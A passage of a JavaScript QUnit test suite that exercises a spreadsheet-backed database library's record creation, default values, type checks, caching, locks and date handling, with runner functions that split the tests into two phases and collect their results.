    // Test date handling
    QUnit.module("Date Handling Tests", {
      beforeEach: function (assert) {
        this.testTableName = "date_test_table";
        this.testHistoryTableName = "date_test_history";

        const tableConfig = {
          tableName: this.testTableName,
          historyTableName: this.testHistoryTableName,
          fields: {
            name: "string",
            created_at: { type: "date", default: "now" },
            updated_at: { type: "date", default: "now" },
            custom_date: { type: "date", default: null },
          },
        };

        db.createTable(tableConfig);
        db.putTableIntoDbContext(tableConfig);
      },

      afterEach: function (assert) {
        // Cleanup test data
        const allRecords = db.getAll(this.testTableName, {}, false);
        if (allRecords.status === 200 && allRecords.data) {
          for (const record of allRecords.data) {
            db.remove(this.testTableName, this.testHistoryTableName, record.id);
          }
        }
      },
    });

    QUnit.test("Date default values", function (assert) {
      console.log("Starting test: Date default values");
      const testData = { name: "Date Test User" };
      const result = db.create(
        this.testTableName,
        testData,
        Object.keys(testData)
      );

      assert.equal(result.status, 200, "Should create record successfully");
      assert.ok(result.data, "Should return created data");

      // Verify date defaults were applied
      const createdRecord = db.read(this.testTableName, result.id);
      assert.equal(
        createdRecord.status,
        200,
        "Should read record successfully"
      );
      assert.ok(
        createdRecord.data.created_at,
        "Created_at should have default value"
      );
      assert.ok(
        createdRecord.data.updated_at,
        "Updated_at should have default value"
      );

      // Check that dates are valid Date objects or strings
      assert.ok(
        createdRecord.data.created_at instanceof Date ||
          typeof createdRecord.data.created_at === "string",
        "Created_at should be Date or string"
      );
      assert.ok(
        createdRecord.data.updated_at instanceof Date ||
          typeof createdRecord.data.updated_at === "string",
        "Updated_at should be Date or string"
      );
    });

    QUnit.test("Custom date handling", function (assert) {
      console.log("Starting test: Custom date handling");
      const customDate = new Date("2023-01-15");
      const testData = {
        name: "Custom Date User",
        custom_date: customDate,
      };
      const result = db.create(
        this.testTableName,
        testData,
        Object.keys(testData)
      );

      assert.equal(result.status, 200, "Should create record successfully");
      assert.ok(result.data, "Should return created data");

      // Verify custom date was stored
      const createdRecord = db.read(this.testTableName, result.id);
      assert.equal(
        createdRecord.status,
        200,
        "Should read record successfully"
      );
      assert.ok(createdRecord.data.custom_date, "Custom date should be stored");
    });
    // This is a completion for the runnerAdvanced function
    // Add this to the end of the existing file after line 4781

    // Test edge cases and error conditions
    QUnit.module("Edge Cases and Error Conditions", {
      beforeEach: function (assert) {
        this.testTableName = "edge_case_test_table";
        this.testHistoryTableName = "edge_case_test_history";

        const tableConfig = {
          tableName: this.testTableName,
          historyTableName: this.testHistoryTableName,
          fields: {
            name: "string",
            description: { type: "string", default: null },
            count: { type: "number", default: 0 },
            created_at: { type: "date", default: "now" },
          },
        };

        db.createTable(tableConfig);
        db.putTableIntoDbContext(tableConfig);
      },

      afterEach: function (assert) {
        // Cleanup test data
        const allRecords = db.getAll(this.testTableName, {}, false);
        if (allRecords.status === 200 && allRecords.data) {
          for (const record of allRecords.data) {
            db.remove(this.testTableName, this.testHistoryTableName, record.id);
          }
        }
      },
    });

    QUnit.test("Empty string handling", function (assert) {
      console.log("Starting test: Empty string handling");
      const testData = { name: "", description: "", count: 0 };
      const result = db.create(
        this.testTableName,
        testData,
        Object.keys(testData)
      );

      assert.equal(
        result.status,
        200,
        "Should create record with empty strings successfully"
      );
      assert.ok(result.data, "Should return created data");

      // Verify empty strings are stored correctly
      const createdRecord = db.read(this.testTableName, result.id);
      assert.equal(
        createdRecord.status,
        200,
        "Should read record successfully"
      );
      assert.equal(createdRecord.data.name, "", "Empty name should be stored");
      assert.equal(
        createdRecord.data.description,
        "",
        "Empty description should be stored"
      );
    });

    QUnit.test("Null value handling", function (assert) {
      console.log("Starting test: Null value handling");
      const testData = { name: "Null Test", description: null, count: 0 };
      const result = db.create(
        this.testTableName,
        testData,
        Object.keys(testData)
      );

      // Note: This test assumes null handling is implemented
      if (result.status === 200) {
        assert.ok(result.data, "Should return created data");

        // Verify null values are handled correctly
        const createdRecord = db.read(this.testTableName, result.id);
        assert.equal(
          createdRecord.status,
          200,
          "Should read record successfully"
        );
        assert.equal(
          createdRecord.data.name,
          "Null Test",
          "Name should be stored"
        );
        // Check if null is preserved or converted to empty string
        assert.ok(
          createdRecord.data.description === null ||
            createdRecord.data.description === "",
          "Description should be null or empty string"
        );
      } else {
        assert.ok(
          result.error,
          "Should return error for null values if not supported"
        );
      }
    });

    QUnit.test("Special character handling", function (assert) {
      console.log("Starting test: Special character handling");
      const specialChars = "!@#$%^&*()_+-=[]{}|;':\",./<>?`~";
      const testData = {
        name: specialChars,
        description: "Special chars test",
        count: 42,
      };
      const result = db.create(
        this.testTableName,
        testData,
        Object.keys(testData)
      );

      assert.equal(
        result.status,
        200,
        "Should create record with special characters successfully"
      );
      assert.ok(result.data, "Should return created data");

      // Verify special characters are stored correctly
      const createdRecord = db.read(this.testTableName, result.id);
      assert.equal(
        createdRecord.status,
        200,
        "Should read record successfully"
      );
      assert.equal(
        createdRecord.data.name,
        specialChars,
        "Special characters should be stored correctly"
      );
    });

    QUnit.test("Advanced bulk record creation", function (assert) {
      console.log("Starting test: Advanced bulk record creation");
      const startTime = Date.now();
      const recordCount = 20; // Reduced for advanced test runner

      // Create multiple records
      for (let i = 0; i < recordCount; i++) {
        const testData = {
          name: `Advanced Bulk Test ${i}`,
          description: `Test record number ${i}`,
          count: i * 5,
        };
        const result = db.create(
          this.testTableName,
          testData,
          Object.keys(testData)
        );
        assert.equal(
          result.status,
          200,
          `Should create record ${i} successfully`
        );
      }

      const endTime = Date.now();
      const duration = endTime - startTime;

      // Verify all records were created
      const allRecords = db.getAll(this.testTableName, {}, false);
      assert.equal(allRecords.status, 200, "Should get all records");
      assert.ok(
        allRecords.data.length >= recordCount,
        `Should have at least ${recordCount} records`
      );

      // Performance assertion (adjust threshold as needed)
      assert.ok(
        duration < 20000,
        `Advanced bulk creation should complete in reasonable time (${duration}ms)`
      );
    });

    QUnit.test("Very long string handling", function (assert) {
      console.log("Starting test: Very long string handling");
      const longString = "A".repeat(1000); // 1000 character string
      const testData = {
        name: longString,
        description: "Long string test",
        count: 1,
      };
      const result = db.create(
        this.testTableName,
        testData,
        Object.keys(testData)
      );

      assert.equal(
        result.status,
        200,
        "Should create record with long string successfully"
      );
      assert.ok(result.data, "Should return created data");

      // Verify long string is stored correctly
      const createdRecord = db.read(this.testTableName, result.id);
      assert.equal(
        createdRecord.status,
        200,
        "Should read record successfully"
      );
      assert.equal(
        createdRecord.data.name,
        longString,
        "Long string should be stored correctly"
      );
      assert.equal(
        createdRecord.data.name.length,
        1000,
        "String length should be preserved"
      );
    });

    // Test field definition utilities
    QUnit.module("Field Definition Utility Tests", {
      beforeEach: function (assert) {
        this.testTableName = "field_def_test_table";
        this.testHistoryTableName = "field_def_test_history";

        const tableConfig = {
          tableName: this.testTableName,
          historyTableName: this.testHistoryTableName,
          fields: {
            name: { type: "string", default: "Default Name" },
            age: { type: "number", default: 25 },
            email: { type: "string", default: "no-email@example.com" },
            active: { type: "boolean", default: true },
            created_at: { type: "date", default: "now" },
          },
        };

        db.createTable(tableConfig);
        db.putTableIntoDbContext(tableConfig);
      },

      afterEach: function (assert) {
        // Cleanup test data
        const allRecords = db.getAll(this.testTableName, {}, false);
        if (allRecords.status === 200 && allRecords.data) {
          for (const record of allRecords.data) {
            db.remove(this.testTableName, this.testHistoryTableName, record.id);
          }
        }
      },
    });

    QUnit.test("_getFieldDefinition functionality", function (assert) {
      console.log("Starting test: _getFieldDefinition functionality");
      // This tests the internal _getFieldDefinition method indirectly
      // by creating a record and checking if field definitions are respected
      const testData = {
        name: "Test User",
        age: 30,
        email: "test@example.com",
        active: false,
      };
      const result = db.create(
        this.testTableName,
        testData,
        Object.keys(testData)
      );

      assert.equal(result.status, 200, "Should create record successfully");
      assert.ok(result.data, "Should return created data");

      // Verify the record was created with correct field handling
      const createdRecord = db.read(this.testTableName, result.id);
      assert.equal(
        createdRecord.status,
        200,
        "Should read record successfully"
      );
      assert.equal(
        createdRecord.data.name,
        "Test User",
        "Name should be as provided"
      );
      assert.equal(createdRecord.data.age, 30, "Age should be as provided");
      assert.equal(
        createdRecord.data.email,
        "test@example.com",
        "Email should be as provided"
      );
      assert.equal(
        createdRecord.data.active,
        false,
        "Active should be as provided"
      );
      assert.ok(
        createdRecord.data.created_at,
        "Created_at should have default value"
      );
    });

    QUnit.test("_getExpectedType functionality", function (assert) {
      console.log("Starting test: _getExpectedType functionality");
      // This tests the internal _getExpectedType method indirectly
      // by creating records with different data types and checking validation
      const testData = { name: "Type Test", age: 25, active: true };
      const result = db.create(
        this.testTableName,
        testData,
        Object.keys(testData)
      );

      assert.equal(result.status, 200, "Should create record successfully");

      // Try to create with wrong type for age
      const invalidData = {
        name: "Invalid Type",
        age: "not a number",
        active: true,
      };
      const invalidResult = db.create(
        this.testTableName,
        invalidData,
        Object.keys(invalidData)
      );

      // Note: This test assumes type validation is implemented
      if (invalidResult.status === 400) {
        assert.ok(invalidResult.error, "Should return error for invalid type");
      } else {
        assert.ok(true, "Type validation not implemented");
      }
    });

    QUnit.test("_getDefaultValue functionality", function (assert) {
      console.log("Starting test: _getDefaultValue functionality");
      // This tests the internal _getDefaultValue method indirectly
      // by creating a record with minimal data and checking defaults
      const testData = { name: "Default Test" }; // Only provide name
      const result = db.create(
        this.testTableName,
        testData,
        Object.keys(testData)
      );

      assert.equal(result.status, 200, "Should create record successfully");

      // Verify defaults were applied
      const createdRecord = db.read(this.testTableName, result.id);
      assert.equal(
        createdRecord.status,
        200,
        "Should read record successfully"
      );
      assert.equal(
        createdRecord.data.name,
        "Default Test",
        "Name should be as provided"
      );
      assert.equal(createdRecord.data.age, 25, "Age should have default value");
      assert.equal(
        createdRecord.data.email,
        "no-email@example.com",
        "Email should have default value"
      );
      assert.equal(
        createdRecord.data.active,
        true,
        "Active should have default value"
      );
      assert.ok(
        createdRecord.data.created_at,
        "Created_at should have default value"
      );
    });

    // Test type checking utilities
    QUnit.module("Type Checking Utility Tests", {
      beforeEach: function (assert) {
        this.testTableName = "type_check_test_table";
        this.testHistoryTableName = "type_check_test_history";

        const tableConfig = {
          tableName: this.testTableName,
          historyTableName: this.testHistoryTableName,
          fields: {
            string_field: "string",
            number_field: "number",
            boolean_field: "boolean",
            date_field: "date",
            created_at: { type: "date", default: "now" },
          },
        };

        db.createTable(tableConfig);
        db.putTableIntoDbContext(tableConfig);
      },

      afterEach: function (assert) {
        // Cleanup test data
        const allRecords = db.getAll(this.testTableName, {}, false);
        if (allRecords.status === 200 && allRecords.data) {
          for (const record of allRecords.data) {
            db.remove(this.testTableName, this.testHistoryTableName, record.id);
          }
        }
      },
    });

    QUnit.test("_checkType functionality", function (assert) {
      console.log("Starting test: _checkType functionality");
      // This tests the internal _checkType method indirectly
      // by creating records with different data types
      const validData = {
        string_field: "Test String",
        number_field: 42,
        boolean_field: true,
        date_field: new Date("2023-01-15"),
      };

      const result = db.create(
        this.testTableName,
        validData,
        Object.keys(validData)
      );
      assert.equal(
        result.status,
        200,
        "Should create record with valid types successfully"
      );

      // Try with invalid types
      const invalidData = {
        string_field: 123, // Should be string
        number_field: "not a number", // Should be number
        boolean_field: "not boolean", // Should be boolean
        date_field: "not a date", // Should be date
      };

      const invalidResult = db.create(
        this.testTableName,
        invalidData,
        Object.keys(invalidData)
      );

      // Note: This test assumes type validation is implemented
      if (invalidResult.status === 400) {
        assert.ok(invalidResult.error, "Should return error for invalid types");
      } else {
        assert.ok(true, "Type validation not implemented");
      }
    });

    QUnit.test("_checkTypeWithLogs functionality", function (assert) {
      console.log("Starting test: _checkTypeWithLogs functionality");
      // This tests the internal _checkTypeWithLogs method indirectly
      // by using createWithLogs which should use this method
      const validData = {
        string_field: "Log Test String",
        number_field: 100,
        boolean_field: false,
        date_field: new Date("2023-06-15"),
      };

      const result = db.createWithLogs(
        this.testTableName,
        validData,
        Object.keys(validData)
      );
      assert.equal(
        result.status,
        200,
        "Should create record with logs successfully"
      );
      assert.ok(result.data, "Should return created data");

      // Verify the record was created
      const createdRecord = db.read(this.testTableName, result.id);
      assert.equal(
        createdRecord.status,
        200,
        "Should read record successfully"
      );
      assert.equal(
        createdRecord.data.string_field,
        "Log Test String",
        "String field should be correct"
      );
      assert.equal(
        createdRecord.data.number_field,
        100,
        "Number field should be correct"
      );
      assert.equal(
        createdRecord.data.boolean_field,
        false,
        "Boolean field should be correct"
      );
    });

    // Test valid creation types
    QUnit.module("Valid Creation Types Tests", {
      beforeEach: function (assert) {
        this.testTableName = "valid_types_test_table";
        this.testHistoryTableName = "valid_types_test_history";

        const tableConfig = {
          tableName: this.testTableName,
          historyTableName: this.testHistoryTableName,
          fields: {
            text_field: "string",
            numeric_field: "number",
            flag_field: "boolean",
            timestamp_field: "date",
            created_at: { type: "date", default: "now" },
          },
        };

        db.createTable(tableConfig);
        db.putTableIntoDbContext(tableConfig);
      },

      afterEach: function () {
        // Cleanup test data
        const allRecords = db.getAll(this.testTableName, {}, false);
        if (allRecords.status === 200 && allRecords.data) {
          for (const record of allRecords.data) {
            db.remove(this.testTableName, this.testHistoryTableName, record.id);
          }
        }
      },
    });

    QUnit.test("_checkValidCreationTypes functionality", function (assert) {
      console.log("Starting test: _checkValidCreationTypes functionality");
      // This tests the internal _checkValidCreationTypes method indirectly
      // by creating records with various valid types
      const testCases = [
        {
          data: {
            text_field: "Simple string",
            numeric_field: 0,
            flag_field: false,
            timestamp_field: new Date(),
          },
          description: "Basic types",
        },
        {
          data: {
            text_field: "",
            numeric_field: -1.5,
            flag_field: true,
            timestamp_field: new Date("2020-01-01"),
          },
          description: "Edge cases",
        },
        {
          data: {
            text_field: "Special chars: !@#$%^&*()",
            numeric_field: 999999,
            flag_field: false,
            timestamp_field: new Date("2030-12-31"),
          },
          description: "Special characters and large numbers",
        },
      ];

      for (const testCase of testCases) {
        const result = db.create(
          this.testTableName,
          testCase.data,
          Object.keys(testCase.data)
        );
        assert.equal(
          result.status,
          200,
          `Should create record with ${testCase.description} successfully`
        );
        assert.ok(
          result.data,
          `Should return data for ${testCase.description}`
        );

        // Verify the record was created correctly
        const createdRecord = db.read(this.testTableName, result.id);
        assert.equal(
          createdRecord.status,
          200,
          `Should read record with ${testCase.description} successfully`
        );
      }
    });

    // Test internal utility methods
    QUnit.module("Internal Utility Method Tests", {
      beforeEach: function (assert) {
        this.testTableName = "internal_util_test_table";
        this.testHistoryTableName = "internal_util_test_history";

        const tableConfig = {
          tableName: this.testTableName,
          historyTableName: this.testHistoryTableName,
          fields: {
            name: "string",
            value: "number",
            created_at: { type: "date", default: "now" },
          },
        };

        db.createTable(tableConfig);
        db.putTableIntoDbContext(tableConfig);

        // Create some test data
        const testData = [
          { name: "Utility Test 1", value: 100 },
          { name: "Utility Test 2", value: 200 },
          { name: "Utility Test 3", value: 300 },
        ];

        for (const data of testData) {
          db.create(this.testTableName, data, Object.keys(data));
        }
      },

      afterEach: function () {
        // Cleanup test data
        const allRecords = db.getAll(this.testTableName, {}, false);
        if (allRecords.status === 200 && allRecords.data) {
          for (const record of allRecords.data) {
            db.remove(this.testTableName, this.testHistoryTableName, record.id);
          }
        }
      },
    });

    QUnit.test("_findRowById functionality", function (assert) {
      console.log("Starting test: _findRowById functionality");
      // This tests the internal _findRowById method indirectly
      // by reading records and verifying they're found correctly

      // Get all records to find an ID
      const allRecords = db.getAll(this.testTableName, {}, false);
      assert.equal(allRecords.status, 200, "Should get all records");
      assert.ok(allRecords.data.length > 0, "Should have records");

      const testId = allRecords.data[0].id;

      // Read the specific record
      const foundRecord = db.read(this.testTableName, testId);
      assert.equal(foundRecord.status, 200, "Should find record by ID");
      assert.equal(foundRecord.data.id, testId, "Should return correct record");
    });

    QUnit.test("_getHeaders functionality", function (assert) {
      console.log("Starting test: _getHeaders functionality");
      // This tests the internal _getHeaders method indirectly
      // by creating a record and checking if headers are properly handled

      const testData = { name: "Header Test", value: 999 };
      const result = db.create(
        this.testTableName,
        testData,
        Object.keys(testData)
      );

      assert.equal(result.status, 200, "Should create record successfully");
      assert.ok(result.data, "Should return created data");

      // Verify the record was created with correct field handling
      const createdRecord = db.read(this.testTableName, result.id);
      assert.equal(
        createdRecord.status,
        200,
        "Should read record successfully"
      );
      assert.equal(
        createdRecord.data.name,
        "Header Test",
        "Name should be stored correctly"
      );
      assert.equal(
        createdRecord.data.value,
        999,
        "Value should be stored correctly"
      );
    });

    QUnit.test("_getNextId functionality", function (assert) {
      console.log("Starting test: _getNextId functionality");
      // This tests the internal _getNextId method indirectly
      // by creating multiple records and checking ID generation

      const initialCount = db.getAll(this.testTableName, {}, false).data.length;

      // Create several new records
      for (let i = 0; i < 3; i++) {
        const testData = { name: `ID Test ${i}`, value: 1000 + i };
        const result = db.create(
          this.testTableName,
          testData,
          Object.keys(testData)
        );
        assert.equal(
          result.status,
          200,
          `Should create record ${i} successfully`
        );
        assert.ok(result.id, `Record ${i} should have an ID`);
      }

      // Verify we have more records
      const finalCount = db.getAll(this.testTableName, {}, false).data.length;
      assert.equal(finalCount, initialCount + 3, "Should have 3 more records");
    });

    QUnit.test("_clearCache functionality", function (assert) {
      console.log("Starting test: _clearCache functionality");
      // This tests the internal _clearCache method indirectly
      // by using caching and then checking if it's cleared

      // First call with cache enabled
      const result1 = db.getAll(this.testTableName, {}, true);
      assert.equal(result1.status, 200, "First call should succeed");
      assert.ok(result1.data, "Should return data");

      // Second call should use cache
      const result2 = db.getAll(this.testTableName, {}, true);
      assert.equal(result2.status, 200, "Second call should succeed");

      // Clear cache (this is done internally when needed)
      // We can't directly call _clearCache, but we can test cache behavior

      // Create a new record to potentially invalidate cache
      const testData = { name: "Cache Clear Test", value: 5000 };
      const createResult = db.create(
        this.testTableName,
        testData,
        Object.keys(testData)
      );
      assert.equal(
        createResult.status,
        200,
        "Should create record successfully"
      );

      // Get all records again (should reflect the new record)
      const result3 = db.getAll(this.testTableName, {}, true);
      assert.equal(result3.status, 200, "Third call should succeed");
      assert.ok(
        result3.data.length > result1.data.length,
        "Should have more records after creation"
      );
    });
  });
}

// Split advanced tests into two phases to avoid execution timeouts
function runnerAdvancedPhase1() {
  return new Promise((resolve, reject) => {
    const db = getDb_();

    const categoryTableConfig = {
      tableName: "CATEGORY",
      historyTableName: "DELETED_CATEGORY",
      fields: {
        name: "string",
        created_at: "date",
      },
    };

    const productTableConfig = {
      tableName: "PRODUCT",
      historyTableName: "DELETED_PRODUCT",
      fields: {
        name: "string",
        price: "number",
        category_fk: "number",
        created_at: "date",
      },
    };

    const customerTableConfig = {
      tableName: "CUSTOMER",
      historyTableName: "DELETED_CUSTOMER",
      fields: {
        name: "string",
        email: "string",
        created_at: "date",
      },
    };

    const orderTableConfig = {
      tableName: "ORDER",
      historyTableName: "DELETED_ORDER",
      fields: {
        customer_fk: "number",
        order_date: "date",
        total: "number",
        created_at: "date",
      },
    };

    const orderDetailConfig = {
      tableName: "ORDER_DETAIL",
      historyTableName: "DELETED_ORDER_DETAIL",
      fields: {
        order_fk: "number",
        product_fk: "number",
        quantity: "number",
        unit_price: "number",
        created_at: "date",
      },
    };

    let allTests = [];
    let currentTest = null;

    QUnit.on("testStart", (testStart) => {
      currentTest = {
        name: testStart.name,
        suiteName: testStart.moduleName,
        fullName: testStart.fullName,
        assertions: [],
        errors: [],
        status: "running",
        sourceCode: getIndividualTestCode(testStart.name),
      };
    });

    QUnit.on("assertion", (assertion) => {
      if (currentTest) {
        currentTest.assertions.push({
          passed: assertion.passed,
          message: assertion.message,
          actual: assertion.actual,
          expected: assertion.expected,
          stack: assertion.stack,
        });
      }
    });

    QUnit.on("testEnd", (testEnd) => {
      if (currentTest) {
        currentTest.status = testEnd.status;
        currentTest.runtime = testEnd.runtime;
        allTests.push({ ...currentTest });
        currentTest = null;
      }
    });

    QUnit.on("runEnd", (runEnd) => {
      const results = {
        testCounts: {
          passed: runEnd.testCounts.passed,
          failed: runEnd.testCounts.failed,
          skipped: runEnd.testCounts.skipped,
          todo: runEnd.testCounts.todo,
          total: runEnd.testCounts.total,
        },
        runtime: runEnd.runtime,
        status: runEnd.status,
        tests: allTests.map((test) => ({
          name: test.name,
          suiteName: test.suiteName,
          fullName: test.fullName,
          status: test.status,
          runtime: test.runtime,
          assertions: test.assertions.map((assertion) => ({
            message: String(assertion.message || ""),
            result: Boolean(assertion.result),
            expected: String(assertion.expected || ""),
            actual: String(assertion.actual || ""),
            source: String(assertion.source || ""),
            module: String(assertion.module || ""),
          })),
          errors: test.errors.map((error) => ({
            message: String(error.message || ""),
            source: String(error.source || ""),
            runtime: String(error.runtime || ""),
          })),
          sourceCode: String(test.sourceCode || ""),
        })),
        sourceCode: String(getTestSourceCode()),
      };

      resolve(results);
    });

    QUnit.start();

    // Phase 1 modules: Cache, Lock, Table Integrity/Validation, Date Handling
    QUnit.module("Cache Functionality Tests", {
      beforeEach: function (assert) {
        this.testTableName = "cache_test_table";
        this.testHistoryTableName = "cache_test_history";

        const tableConfig = {
          tableName: this.testTableName,
          historyTableName: this.testHistoryTableName,
          fields: {
            name: "string",
            value: "number",
          },
        };

        db.createTable(tableConfig);
        db.putTableIntoDbContext(tableConfig);

        const testData = [
          { name: "Cache Item 1", value: 100 },
          { name: "Cache Item 2", value: 200 },
          { name: "Cache Item 3", value: 300 },
        ];

        for (const data of testData) {
          db.create(this.testTableName, data, Object.keys(data));
        }
      },

      afterEach: function (assert) {
        const allRecords = db.getAll(this.testTableName, {}, false);
        if (allRecords.status === 200 && allRecords.data) {
          for (const record of allRecords.data) {
            db.remove(this.testTableName, this.testHistoryTableName, record.id);
          }
        }
      },
    });

    QUnit.test("getAll with caching enabled", function (assert) {
      const result1 = db.getAll(this.testTableName, {}, true);
      assert.equal(result1.status, 200, "First call should succeed");
      assert.ok(result1.data, "Should return data");
      const result2 = db.getAll(this.testTableName, {}, true);
      assert.equal(result2.status, 200, "Second call should succeed");
      assert.ok(result2.data, "Should return cached data");
      assert.deepEqual(
        result1.data,
        result2.data,
        "Cached results should be identical"
      );
    });

    QUnit.test("getAll with caching disabled", function (assert) {
      const result1 = db.getAll(this.testTableName, {}, false);
      assert.equal(result1.status, 200, "First call should succeed");
      assert.ok(result1.data, "Should return data");
      const result2 = db.getAll(this.testTableName, {}, false);
      assert.equal(result2.status, 200, "Second call should succeed");
      assert.ok(result2.data, "Should return fresh data");
      assert.deepEqual(
        result1.data,
        result2.data,
        "Fresh results should be identical"
      );
    });

    QUnit.module("Lock Service Tests", {
      beforeEach: function (assert) {
        this.testTableName = "lock_test_table";
        this.testHistoryTableName = "lock_test_history";

        const tableConfig = {
          tableName: this.testTableName,
          historyTableName: this.testHistoryTableName,
          fields: {
            name: "string",
            value: "number",
          },
        };

        db.createTable(tableConfig);
        db.putTableIntoDbContext(tableConfig);
      },

      afterEach: function (assert) {
        const allRecords = db.getAll(this.testTableName, {}, false);
        if (allRecords.status === 200 && allRecords.data) {
          for (const record of allRecords.data) {
            db.remove(this.testTableName, this.testHistoryTableName, record.id);
          }
        }
      },
    });

    QUnit.test("releaseLocks functionality", function (assert) {
      const testData = { name: "Lock Test", value: 100 };
      const createResult = db.create(
        this.testTableName,
        testData,
        Object.keys(testData)
      );
      assert.equal(
        createResult.status,
        200,
        "Should create record successfully"
      );
      db.releaseLocks();
      const readResult = db.read(this.testTableName, createResult.id);
      assert.equal(
        readResult.status,
        200,
        "Should read record after lock release"
      );
      assert.ok(readResult.data, "Should return data after lock release");
    });

    QUnit.module("Table Integrity and Validation Tests", {
      beforeEach: function (assert) {
        this.testTableName = "integrity_test_table";
        this.testHistoryTableName = "integrity_test_history";

        const tableConfig = {
          tableName: this.testTableName,
          historyTableName: this.testHistoryTableName,
          fields: {
            name: "string",
            email: "string",
            age: { type: "number", default: 25 },
          },
        };

        db.createTable(tableConfig);
        db.putTableIntoDbContext(tableConfig);
      },

      afterEach: function (assert) {
        const allRecords = db.getAll(this.testTableName, {}, false);
        if (allRecords.status === 200 && allRecords.data) {
          for (const record of allRecords.data) {
            db.remove(this.testTableName, this.testHistoryTableName, record.id);
          }
        }
      },
    });

    QUnit.test("_validateData with valid data", function (assert) {
      const validData = {
        name: "Valid User",
        email: "user@example.com",
        age: 25,
      };
      const result = db.create(
        this.testTableName,
        validData,
        Object.keys(validData)
      );
      assert.equal(result.status, 200, "Should create record with valid data");
      assert.ok(result.data, "Should return created data");
    });

    QUnit.test("_validateData with invalid age", function (assert) {
      const invalidData = {
        name: "Invalid User",
        email: "user@example.com",
        age: -5,
      };
      const result = db.create(
        this.testTableName,
        invalidData,
        Object.keys(invalidData)
      );
      if (result.status === 400) {
        assert.ok(result.error, "Should return error for invalid age");
      } else {
        assert.ok(true, "Validation not implemented for age constraints");
      }
    });

    QUnit.module("Date Handling Tests", {
      beforeEach: function (assert) {
        this.testTableName = "date_test_table";
        this.testHistoryTableName = "date_test_history";

        const tableConfig = {
          tableName: this.testTableName,
          historyTableName: this.testHistoryTableName,
          fields: {
            name: "string",
            created_at: { type: "date", default: "now" },
            updated_at: { type: "date", default: "now" },
            custom_date: { type: "date", default: null },
          },
        };

        db.createTable(tableConfig);
        db.putTableIntoDbContext(tableConfig);
      },

      afterEach: function (assert) {
        const allRecords = db.getAll(this.testTableName, {}, false);
        if (allRecords.status === 200 && allRecords.data) {
          for (const record of allRecords.data) {
            db.remove(this.testTableName, this.testHistoryTableName, record.id);
          }
        }
      },
    });

    QUnit.test("Date default values", function (assert) {
      const testData = { name: "Date Test User" };
      const result = db.create(
        this.testTableName,
        testData,
        Object.keys(testData)
      );
      assert.equal(result.status, 200, "Should create record successfully");
      assert.ok(result.data, "Should return created data");
      const createdRecord = db.read(this.testTableName, result.id);
      assert.equal(
        createdRecord.status,
        200,
        "Should read record successfully"
      );
      assert.ok(
        createdRecord.data.created_at,
        "Created_at should have default value"
      );
      assert.ok(
        createdRecord.data.updated_at,
        "Updated_at should have default value"
      );
    });

    QUnit.test("Custom date handling", function (assert) {
      const customDate = new Date("2023-01-15");
      const testData = { name: "Custom Date User", custom_date: customDate };
      const result = db.create(
        this.testTableName,
        testData,
        Object.keys(testData)
      );
      assert.equal(result.status, 200, "Should create record successfully");
      assert.ok(result.data, "Should return created data");
      const createdRecord = db.read(this.testTableName, result.id);
      assert.equal(
        createdRecord.status,
        200,
        "Should read record successfully"
      );
      assert.ok(createdRecord.data.custom_date, "Custom date should be stored");
    });
  });
}

function runnerAdvancedPhase2() {
  return new Promise((resolve, reject) => {
    const db = getDb_();

    const categoryTableConfig = {
      tableName: "CATEGORY",
      historyTableName: "DELETED_CATEGORY",
      fields: {
        name: "string",
        created_at: "date",
      },
    };

    const productTableConfig = {
      tableName: "PRODUCT",
      historyTableName: "DELETED_PRODUCT",
      fields: {
        name: "string",
        price: "number",
        category_fk: "number",
        created_at: "date",
      },
    };

    const customerTableConfig = {
      tableName: "CUSTOMER",
      historyTableName: "DELETED_CUSTOMER",
      fields: {
        name: "string",
        email: "string",
        created_at: "date",
      },
    };

    const orderTableConfig = {
      tableName: "ORDER",
      historyTableName: "DELETED_ORDER",
      fields: {
        customer_fk: "number",
        order_date: "date",
        total: "number",
        created_at: "date",
      },
    };

    const orderDetailConfig = {
      tableName: "ORDER_DETAIL",
      historyTableName: "DELETED_ORDER_DETAIL",
      fields: {
        order_fk: "number",
        product_fk: "number",
        quantity: "number",
        unit_price: "number",
        created_at: "date",
      },
    };

    let allTests = [];
    let currentTest = null;

    QUnit.on("testStart", (testStart) => {
      currentTest = {
        name: testStart.name,
        suiteName: testStart.moduleName,
        fullName: testStart.fullName,
        assertions: [],
        errors: [],
        status: "running",
        sourceCode: getIndividualTestCode(testStart.name),
      };
    });

    QUnit.on("assertion", (assertion) => {
      if (currentTest) {
        currentTest.assertions.push({
          passed: assertion.passed,
          message: assertion.message,
          actual: assertion.actual,
          expected: assertion.expected,
          stack: assertion.stack,
        });
      }
    });

    QUnit.on("testEnd", (testEnd) => {
      if (currentTest) {
        currentTest.status = testEnd.status;
        currentTest.runtime = testEnd.runtime;
        allTests.push({ ...currentTest });
        currentTest = null;
      }
    });

    QUnit.on("runEnd", (runEnd) => {
      const results = {
        testCounts: {
          passed: runEnd.testCounts.passed,
          failed: runEnd.testCounts.failed,
          skipped: runEnd.testCounts.skipped,
          todo: runEnd.testCounts.todo,
          total: runEnd.testCounts.total,
        },
        runtime: runEnd.runtime,
        status: runEnd.status,
        tests: allTests.map((test) => ({
          name: test.name,
          suiteName: test.suiteName,
          fullName: test.fullName,
          status: test.status,
          runtime: test.runtime,
          assertions: test.assertions.map((assertion) => ({
            message: String(assertion.message || ""),
            result: Boolean(assertion.result),
            expected: String(assertion.expected || ""),
            actual: String(assertion.actual || ""),
            source: String(assertion.source || ""),
            module: String(assertion.module || ""),
          })),
          errors: test.errors.map((error) => ({
            message: String(error.message || ""),
            source: String(error.source || ""),
            runtime: String(error.runtime || ""),
          })),
          sourceCode: String(test.sourceCode || ""),
        })),
        sourceCode: String(getTestSourceCode()),
      };

      resolve(results);
    });

    QUnit.start();

    // Phase 2 modules: Edge Cases, Field Definition, Type Checking, Valid Creation Types, Internal Utilities
    QUnit.module("Edge Cases and Error Conditions", {
      beforeEach: function (assert) {
        this.testTableName = "edge_case_test_table";
        this.testHistoryTableName = "edge_case_test_history";

        const tableConfig = {
          tableName: this.testTableName,
          historyTableName: this.testHistoryTableName,
          fields: {
            name: "string",
            description: { type: "string", default: null },
            count: { type: "number", default: 0 },
            created_at: { type: "date", default: "now" },
          },
        };

        db.createTable(tableConfig);
        db.putTableIntoDbContext(tableConfig);
      },

      afterEach: function (assert) {
        const allRecords = db.getAll(this.testTableName, {}, false);
        if (allRecords.status === 200 && allRecords.data) {
          for (const record of allRecords.data) {
            db.remove(this.testTableName, this.testHistoryTableName, record.id);
          }
        }
      },
    });

    QUnit.test("Empty string handling", function (assert) {
